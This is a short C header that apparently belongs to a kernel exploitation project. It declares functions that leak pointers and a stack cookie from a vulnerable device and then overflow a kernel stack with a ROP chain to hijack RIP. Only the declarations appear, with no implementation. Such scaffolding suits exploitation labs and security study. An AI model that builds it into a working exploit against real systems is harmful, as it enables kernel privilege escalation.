#ifndef STACK_OVERFLOW_H
#define STACK_OVERFLOW_H

#include <stdint.h>   
#include <stddef.h>  
#include "rop.h"

/* Leak a qword (pointer-sized) value at a given offset */
uintptr_t leak_ptr(int fd, size_t leak_size, size_t ptr_offset);

/* Leak stack cookie from vulnerable device */
uintptr_t leak_cookie(int fd, size_t leak_slots, size_t cookie_offset);

/* Perform kernel stack overflow to hijack RIP */
void stack_overflow(int fd, 
                    uintptr_t cookie,
                    size_t cookie_offset,
                    size_t pl_len,
                    rop_buffer_t rop);

#endif  // STACK_OVERFLOW_H
